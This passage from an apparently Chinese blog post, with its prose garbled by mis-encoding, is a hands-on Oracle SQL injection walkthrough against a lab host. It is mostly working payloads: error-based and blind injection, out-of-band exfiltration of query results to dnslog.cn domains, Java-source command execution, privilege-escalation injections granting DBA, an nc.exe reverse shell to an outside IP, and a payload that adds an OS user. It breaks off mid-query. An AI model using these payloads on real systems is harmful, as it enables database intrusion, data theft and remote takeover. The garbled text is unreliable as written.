<li><code>utl_inaddr.get_host_name</code>è¿™ç§æ–¹æ³•åœ¨ <code>Oracle 8g</code>ï¼Œ<code>9g</code>ï¼Œ<code>10g</code>ä¸­ä¸éœ€è¦ä»»ä½•æƒé™ä½†æ˜¯åœ¨<code>Oracle 11g</code>ä»¥åŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œå®˜æ–¹åŠ å¼ºäº†è®¿é—®æ§åˆ¶æƒé™ï¼Œæ‰€ä»¥åœ¨<code>11g</code>ä»¥åè¦ä½¿ç”¨æ­¤æ–¹æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå½“å‰æ•°æ®åº“ç”¨æˆ·å¿…é¡»æœ‰ç½‘ç»œè®¿é—®æƒé™ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/004.png" alt="image-20200703093602971"></p>
<ul>
<li><code>ctxsys.drithsx.sn</code>Oracle ä¸­ç”¨äºå¤„ç†æ–‡æœ¬ï¼Œå½“ä¼ å…¥å‚æ•°ç±»å‹é”™è¯¯æ—¶ï¼Œä¼šè¿”å›å¼‚å¸¸ã€‚</li>
</ul>
<p><img src="/posts/bb8356a5/005.png" alt="image-20200703093747004"></p>
<ul>
<li><code>CTXSYS.CTX_REPORT.TOKEN_TYPE</code>ä½œç”¨ä¸ <code>ctxsys.drithsx.sn</code> ç±»ä¼¼ï¼Œç”¨äºå¤„ç†æ–‡æœ¬ã€‚ç¡®ä¿æ•°æ®ç±»å‹ä¸å‰é¢è¯­å¥ä¸€è‡´ï¼Œè¿™é‡Œåªèƒ½ä½¿ç”¨phoneå­—æ®µï¼Œ<code>number</code>å‹ï¼Œå…è®¸ä¸ºç©ºã€‚ã€‚ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#39;123&#39;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/006.png" alt="image-20200703094207462"></p>
<ul>
<li><code>XMLType</code> åœ¨è°ƒç”¨çš„æ—¶å€™å¿…é¡»ä»¥<code>&lt;:</code>å¼€å¤´ï¼Œ<code>&gt;</code>ç»“å°¾ï¼Œå³ <code>&#39;&lt;:&#39;||balabala||&#39;&gt;&#39;</code> æˆ–è€… <code>chr(60)||balabal||chr(62ï¼‰</code>ã€‚å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœè¿”å›çš„æ•°æ®ç§æœ‰ç©ºæ ¼çš„è¯ï¼Œå®ƒä¼šè‡ªåŠ¨æˆªæ–­ï¼Œå¯¼è‡´æ•°æ®ä¸å®Œæ•´ï¼Œè¿™ç§æƒ…å†µä¸‹å…ˆè½¬ä¸º hexï¼Œå†å¯¼å‡ºã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual;</span><br><span class="line">âš ï¸æ³¨æ„ï¼šè¯¥å‡½æ•°å¯¹åº”çš„æ•°æ®ç±»å‹ä¸ºï¼šXMLTYPEï¼Œä½¿ç”¨unionc select å¯èƒ½æ— æ³•å¯¹åº”æ•°æ®ç±»å‹ã€‚</span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual) is not null </span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/007.png" alt="image-20200703101217646"></p>
<ul>
<li><code>dbms_xdb_version.checkin</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum&#x3D;1)) from dual) is not null s</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/008.png" alt="image-20200703101002277"></p>
<ul>
<li><code>dbms_xdb_version.makeversioned</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dbms_xdb_version.uncheckout</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dbms_utility.sqlid_to_sqlhash</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ordsys.ord_dicom.getmappingxpath</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>UTL_INADDR.get_host_address</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure>

<h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>å¸ƒå°”å’Œæ—¶é—´ç›²æ³¨ï¼Œå‚è€ƒå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åˆ©ç”¨æ—¶é—´å»¶è¿Ÿå‡½æ•°é…åˆreplaceå’Œsubsträ»¥åŠdecodeæ¥è¿›è¡Œæ³¨å…¥</span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and DBMS_PIPE.RECEIVE_MESSAGE(&#39;cc&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 3))&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;cc&#39;,3),0) from dual) is not null</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/009.png" alt="image-20200703153315774"></p>
<h3 id="OOBå¤–å¸¦"><a href="#OOBå¤–å¸¦" class="headerlink" title="OOBå¤–å¸¦"></a>OOBå¤–å¸¦</h3><p>å¸¦å¤–é€šä¿¡å³ä½¿ç”¨ Oracle å‘é€<code>HTTP</code>æˆ–è€…<code>DNS</code>è¯·æ±‚ï¼Œå°†æŸ¥è¯¢ç»“æœå¸¦åˆ°è¯·æ±‚ä¸­ï¼Œç„¶åç›‘æµ‹å¤–ç½‘æœåŠ¡å™¨çš„<code>HTTP</code>å’Œ<code>DNS</code>æ—¥å¿—ï¼Œä»æ—¥å¿—ä¸­è·å– sql è¯­å¥æŸ¥è¯¢çš„ç»“æœï¼Œé€šè¿‡è¿™ç§æ–¹å¼å°†ç¹ççš„ç›²æ³¨è½¬æ¢æˆå¯ä»¥ç›´æ¥ç®€ä¾¿çš„è·å–æŸ¥è¯¢ç»“æœçš„æ–¹å¼ï¼Œå°¤å…¶æ˜¯åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œèƒ½æå¤§åœ°åŠ å¿«é€Ÿåº¦ã€‚ç±»ä¼¼äº Windows çš„MySQL ä¸­åˆ©ç”¨ <code>LOAD_FILE</code> çš„ dns å¸¦å¤–é€šä¿¡ã€‚</p>
<p>å€Ÿç”¨DNSlog/CEYEçš„payloadï¼Œå°è¯•ã€‚</p>
<ul>
<li><code>utl_http.request()</code> å‘å¤–ç½‘ä¸»æœºå‘é€ <code>http</code> è¯·æ±‚:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select utl_http.request(&#39;http:&#x2F;&#x2F;&#39;||(select user from dual)||&#39;.d1a6j9.dnslog.cn&#x2F;&#39;) from dual) is not null</span><br></pre></td></tr></table></figure>

<ul>
<li><code>utl_inaddr.get_host_address</code>å°†æŸ¥è¯¢ç»“æœæ‹¼æ¥åˆ°åŸŸåä¸‹ï¼Œå¹¶ä½¿ç”¨DNSè®°å½•è§£ææ—¥å¿—ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select utl_inaddr.get_host_address((select user from dual)||&#39;.ka255j.dnslog.cn&#39;) from dual) is not null</span><br></pre></td></tr></table></figure>

<ul>
<li><code>SYS.DBMS_LDAP.INIT</code>ä¸ <code>utl_inaddr.get_host_address</code> ç±»ä¼¼ï¼Œå¾ˆå¤šæ—¶å€™æ•°æ®æœåŠ¡å™¨éƒ½æ˜¯ç«™åº“åˆ†ç¦»çš„ï¼Œè€Œä¸”ä¸ä¸€å®šèƒ½ä¸»åŠ¨è®¿é—®å¤–ç½‘ã€‚ä½†æ˜¯æœ‰æ—¶å€™å¯èƒ½ä¼šå…è®¸ DNS è¯·æ±‚ã€‚å¹¶ä¸”è¿™ä¸ªå‡½æ•°åœ¨ 10g/11g ä¸­æ˜¯ public æƒé™ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#39;.2eo2cw.dnslog.cn&#39;,80) from dual) is not null</span><br></pre></td></tr></table></figure>

<ul>
<li><code>HTTPURITYPE</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (SELECT HTTPURITYPE((select user from dual)||&#39;.j79nme.dnslog.cn&#39;).GETCLOB() FROM DUAL) is not null</span><br></pre></td></tr></table></figure>

<p>Oracle HTTPä»£ç†å®ç°è·¨åº“æ”»å‡»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select cast(substr(httpuritype(â€˜http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqlinjection&#x2F;default3.aspâ€™).getclob(),1,1000) as varchar(1000)) from dual--</span><br><span class="line"></span><br><span class="line">union select cast(substr(httpuritype(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection&#x2F;default3.asp?qid&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;all&#x2F;**&#x2F;select&#x2F;**&#x2F;1,@@version,user&#39;).getclob(),1,1000) as varchar(1000)) from dual--</span><br><span class="line"></span><br><span class="line">union select cast(substr(httpuritype(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection&#x2F;default3.asp?qid&#x3D;1;exec&#x2F;**&#x2F;master..xp_cmdshell&#x2F;**&#x2F;&quot;C:\nc.exe%20172.16.56.1%204444%20-e%20cmd.exe&quot; &#39;).  getclob(),1,3000) as varchar(3000)) from dual--</span><br></pre></td></tr></table></figure>

<h2 id="Oracle11g-å‘½ä»¤æ‰§è¡Œ"><a href="#Oracle11g-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Oracle11g å‘½ä»¤æ‰§è¡Œ"></a>Oracle11g å‘½ä»¤æ‰§è¡Œ</h2><ul>
<li>ç›´è¿æ•°æ®åº“æƒ…å†µä¸‹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windowsä¸‹ é€šè¿‡å…³é”®å­—host</span><br><span class="line">host whoami</span><br><span class="line"></span><br><span class="line"># Linuxä¸‹ é€šè¿‡å…³é”®å­—ç¬¦ !</span><br><span class="line">!whoami</span><br></pre></td></tr></table></figure>

<p>11.2.0.1.0 å‘½ä»¤æ‰§è¡Œæ­¥éª¤ï¼š</p>
<ol>
<li>åˆ›å»ºJAVA Source</li>
<li>èµ‹äºˆæ‰§è¡Œæƒé™</li>
<li>åˆ›å»ºå‡½æ•°</li>
<li>è°ƒç”¨å‡½æ•°æ‰§è¡Œå‘½ä»¤</li>
</ol>
<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><ul>
<li>åˆ›å»ºJAVA Source</li>
</ul>
<p>è¿™é‡Œåˆ›å»ºè¡¨æ—¶åªæœ‰<code>phone</code>å­—æ®µå…è®¸ä¸ºnull,å› æ­¤éœ€è¦åŒ¹é…è¯¥å­—æ®µæ•°æ®ç±»å‹ï¼Œåˆ›å»ºJAVA Sourceã€‚ï¼ˆ<code>dbms_xmlquery.newcontext</code>åˆ›å»ºJAVA Sourceæ—¶è¿”å›ä¸ºnullï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<p>åœ¨æ•°æ®åº“ç›´æ¥æ‰§è¡Œæ—¶ï¼š</p>
<p><img src="/posts/bb8356a5/010.png" alt="image-20200702093300028"></p>
<p>è”åˆæŸ¥è¯¢æ—¶ï¼š</p>
<p><img src="/posts/bb8356a5/011.png" alt="image-20200702093117462"></p>
<p>æŸ¥çœ‹<code>all_objects</code>å†…éƒ¨çš„å˜åŒ–ã€‚</p>
<p><img src="/posts/bb8356a5/012.png" alt="image-20200702093729519"></p>
<ul>
<li>èµ‹äºˆæ‰§è¡Œæƒé™</li>
</ul>
<p>æˆ‘è¿™äº†æµ‹è¯•äº†ä¸‰ä¸ªç”¨æˆ·ï¼Œéƒ½ä¸éœ€è¦æ‰§è¡Œæƒé™ã€‚</p>
<p>ccä¸ºsystemè¿æ¥ï¼Œrootä¸ºrootç”¨æˆ·è¿æ¥ï¼Œtestä¸ºtestè¿æ¥ã€‚</p>
<p><img src="/posts/bb8356a5/013.png" alt="image-20200702142914225"></p>
<p><img src="/posts/bb8356a5/014.png" alt="image-20200702143015246"></p>
<p>ææƒè¯­å¥,è¿™é‡Œæ²¡æœ‰ç”¨åˆ°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;SYSTEM&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;EXECUTE&#39;&#39;&#39;&#39;);end;&#39;&#39;commit;end;&#39;) from dual;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä½¿ç”¨SYS.LT.CREATEWORKSPACEææƒ 9iR2, 10gR1, 10gR2 and 11gR1     #fixed 2009.7</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39;</span><br><span class="line">begin SYS.LT.CREATEWORKSPACE(&#39;&#39;&#39;&#39;A10&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and TEST.pwn()&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x&#39;&#39;&#39;&#39;);SYS.LT.REMOVEWORKSPA CE(&#39;&#39;&#39;&#39;A10&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and TEST.pwn()&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x&#39;&#39;&#39;&#39;);end;&#39;&#39;; commit; end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä½¿ç”¨sys.dbms_cdc_publish.create_change_setææƒ 10gR1, 10gR2, 11g R1 and 11gR2   #fixed 2010.10</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; begin sys.dbms_cdc_publish.create_change_set(&#39;&#39;&#39;&#39; a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;||TEST.pwn()||&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;Y&#39;&#39;&#39;&#39;,s ysdate,sysdate);end;&#39;&#39;; commit; end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä½¿ç”¨GET_DOMAIN_INDEX_TABLES Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;foo&#39;,&#39;bar&#39;,&#39;DBMS_OUTPUT&quot;.PUT_LINE(:P1); EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant dba to TEST&#39;&#39;&#39;&#39;; END;&#39;&#39;; END;--&#39;, &#39;&#39;, 0, &#39;1&#39;, 0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºå‡½æ•°</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/015.png" alt="image-20200701164925448"></p>
<ul>
<li>åˆ¤æ–­å‡½æ•°æ˜¯å¦åˆ›å»ºæˆåŠŸ</li>
</ul>
<p>æŸ¥çœ‹all_objectsè¡¨ä¸­çš„æ˜¯å¦å·²ç»å­˜åˆšæ‰åˆ›å»ºçš„å‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,OBJECT_ID from all_objects where object_name &#x3D;&#39;LINXRUNCMD&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/016.png" alt="image-20200701165318737"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from all_objects where object_name like &#39;%LINX%&#39; or object_name like &#39;%Linx%&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œå‘½ä»¤</li>
</ul>
<p>æ³¨æ„âš ï¸ï¼šæ‰§è¡Œå‘½ä»¤æ—¶å€™è¿”å›çš„ç»“æœæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æ— æ³•ç”¨phoneå­—æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,LinxRunCMD(&#39;whoami&#39;),null,null from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/017.png" alt="image-20200701171038862"></p>
<ul>
<li>åˆ é™¤å‡½æ•°</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop function LinxRunCMD</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šæµ‹è¯•æ˜¯åœ¨systemç”¨æˆ·ä¸‹è¿›è¡Œï¼Œé‚£ä¹ˆå¦‚æœæ²¡æœ‰DBAæƒé™å‘¢ï¼Ÿ</p>
<p><img src="/posts/bb8356a5/018.png" alt="image-20200702151015602"></p>
<p>è¿™é‡Œä½¿ç”¨ROOTç”¨æˆ·ï¼Œæ ¹æ®ä¸Šè¿°è¿‡ç¨‹ï¼Œä¾æ—§å¯ä»¥ã€‚</p>
<p><img src="/posts/bb8356a5/019.png" alt="image-20200702151119873"></p>
<p><strong>ä»¥ä¸‹å‡½æ•°å‡ä¸èƒ½åœ¨11.2.0.1.0ä¸Šæ­£å¸¸æ‰§è¡Œå‘½ä»¤ã€‚ï¼ˆè¿™é‡Œæ˜¯æˆ‘è‡ªå·±çš„æµ‹è¯•ç¯å¢ƒ- -ï¼‰</strong></p>
<h3 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL()"></a>DBMS_JAVA_TEST.FUNCALL()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select DBMS_JAVA_TEST.FUNCALL(&#39;oracle&#x2F;aurora&#x2F;util&#x2F;Wrapper&#39;,&#39;main&#39;,&#39;c:\\Windows\\System32\\cmd.exe&#39;,&#39;&#x2F;c&#39;,&#39;whoami&#39;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/020.png" alt="image-20200702115920307"></p>
<h3 id="DBMS-JAVA-RUNJAVA"><a href="#DBMS-JAVA-RUNJAVA" class="headerlink" title="DBMS_JAVA.RUNJAVA()"></a>DBMS_JAVA.RUNJAVA()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT DBMS_JAVA.RUNJAVA(&#39;oracle&#x2F;aurora&#x2F;util&#x2F;Wrapper  c:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;) FROM DUAL</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/021.png" alt="image-20200702141620519"> </p>
<h3 id="DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC"><a href="#DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC" class="headerlink" title="DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC"></a>DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,&#39;VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;CCCCC&#39;) from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/022.png" alt="image-20200702143522190"></p>
<h3 id="å¦å¤–ä¸€ç§æ–¹å¼"><a href="#å¦å¤–ä¸€ç§æ–¹å¼" class="headerlink" title="å¦å¤–ä¸€ç§æ–¹å¼"></a>å¦å¤–ä¸€ç§æ–¹å¼</h3><p>å‚è€ƒåˆ«äººçš„ï¼Œéœ€è¦DBAæƒé™ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä¸æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(&#39;DBMS_SCHEDULER.create_program(&#39;&#39;myprog10&#39;&#39;,&#39;&#39;EXECUTABLE&#39;&#39;,&#39;&#39;net user pwnedfromweb pwn3d!! &#x2F;add&#39;&#39;,0,TRUE);DBMS_SCHEDULER.create_job(job_name&#x3D;&gt;&#39;&#39;myjob10&#39;&#39;,program_name&#x3D;&gt;&#39;&#39;myprog10&#39;&#39;,start_date&#x3D;&gt;NULL,repeat_interval&#x3D;&gt;NULL,end_date&#x3D;&gt;NULL,enabled&#x3D;&gt;TRUE,auto_drop&#x3D;&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name&#x3D;&gt;&#39;&#39;myprog10&#39;&#39;);dbms_scheduler.purge_log;&#39;)from dual) is not null --</span><br></pre></td></tr></table></figure>

<h2 id="Oracle-10g-å‘½ä»¤æ‰§è¡Œ"><a href="#Oracle-10g-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Oracle 10g å‘½ä»¤æ‰§è¡Œ"></a>Oracle 10g å‘½ä»¤æ‰§è¡Œ</h2><p>Server 2003ä¸‹<code>10.2.0.1.0</code>ã€‚</p>
<h3 id="DBMS-EXPORT-EXTENSION"><a href="#DBMS-EXPORT-EXTENSION" class="headerlink" title="DBMS_EXPORT_EXTENSION"></a>DBMS_EXPORT_EXTENSION</h3><p>è¾“å‡ºæ‰©å±•åŠŸèƒ½åŒ…ï¼Œå…¶ä¸­å­˜åœ¨ä¸‰ä¸ªå±é™©å‡½æ•°ï¼Œget_domian_index_metadataï¼Œget_v2_domain_index_tablesï¼Œget_domain_index_tablesã€‚éƒ½æ˜¯ä»¥sysæƒé™å®šä¹‰ï¼Œé»˜è®¤ä½æƒé™ç”¨æˆ·å¯ä»¥è°ƒç”¨ã€‚</p>
<ul>
<li>é¦–å…ˆåˆ›å»º JAVA Source</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux </span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line"># å‡ºç°æˆªæ–­é—®é¢˜ï¼Œå¯¼è‡´dir,tasklistç­‰å‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œå¯ä»¥æ‰§è¡Œwhoami,ipconfigç­‰ã€‚ã€‚</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;Command&quot; as import java.io.*;public class Command&#123;public static String exec(String cmd) throws Exception&#123;String sb&#x3D;&quot;&quot;;BufferedInputStream in &#x3D; new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr &#x3D; inBr.readLine()) !&#x3D; null)sb+&#x3D;lineStr+&quot;\n&quot;;inBr.close();in.close();return sb;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from 